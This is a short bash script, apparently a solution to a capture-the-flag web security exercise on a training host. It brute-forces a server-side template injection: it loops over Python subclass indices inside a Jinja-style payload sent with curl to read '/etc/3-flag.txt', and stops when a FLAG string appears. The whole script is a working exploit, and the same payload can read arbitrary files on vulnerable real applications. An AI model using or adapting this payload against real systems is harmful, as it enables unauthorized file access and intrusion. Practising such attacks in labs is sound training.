#!/bin/bash

for i in {0..500}; do
  payload="{{ ''.__class__.__mro__[1].__subclasses__()[$i]('/etc/3-flag.txt').read() }}"
  echo "[*] Trying index $i"
  result=$(curl -sG http://web0x07.hbtn/task3/list_file --data-urlencode "rapport=$payload")

  if echo "$result" | grep -q "FLAG{"; then
    echo "[+] Success! Index $i:"
    echo "$result" | grep FLAG
    break
  fi
done
